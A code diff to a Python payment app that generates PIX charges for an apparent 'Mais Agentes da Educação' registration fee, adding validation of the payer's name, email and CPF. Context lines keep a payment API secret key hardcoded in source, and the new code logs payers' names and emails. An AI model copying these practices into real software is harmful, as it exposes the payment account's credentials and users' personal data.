@@ -31,10 +31,18 @@ class For4PaymentsAPI:
         }
     
     def create_pix_payment(self, name, email, cpf, amount, description="Taxa de Inscrição - Mais Agentes da Educação"):
+        # Validar dados obrigatórios
+        if not name or not email or not cpf:
+            raise ValueError("Nome, email e CPF são obrigatórios")
+        
+        # Validar email
+        if "@" not in email or "." not in email.split("@")[-1]:
+            raise ValueError("Email inválido")
+        
         # Validar e formatar CPF
         cpf_clean = ''.join(filter(str.isdigit, cpf))
         if len(cpf_clean) != 11:
-            raise ValueError("CPF inválido")
+            raise ValueError("CPF inválido - deve conter 11 dígitos")
         
         # Converter valor para centavos
         amount_cents = int(amount * 100)
@@ -526,11 +534,25 @@ def gerar_pix():
         secret_key = "aa64f1cb-1db0-41bc-8211-0d11d1ffced2"
         api = For4PaymentsAPI(secret_key)
         
+        # Validar dados recebidos
+        nome = dados.get('nome_pagador', '').strip()
+        email = dados.get('email_pagador', '').strip()
+        cpf = dados.get('cpf_pagador', '').strip()
+        
+        if not nome or not email or not cpf:
+            return jsonify({
+                'success': False, 
+                'message': 'Dados do usuário incompletos. Nome, email e CPF são obrigatórios.'
+            }), 400
+        
+        # Log dos dados recebidos para debug
+        app.logger.info(f"Gerando PIX para: {nome}, {email}, CPF: {cpf[:3]}***")
+        
         # Criar pagamento PIX
         payment = api.create_pix_payment(
-            name=dados.get('nome_pagador', 'Nome não informado'),
-            email=dados.get('email_pagador', 'email@exemplo.com'),
-            cpf=dados.get('cpf_pagador', ''),
+            name=nome,
+            email=email,
+            cpf=cpf,
             amount=dados.get('valor', 87.40),
             description=dados.get('descricao', 'Taxa de Inscrição - Mais Agentes da Educação')
         )
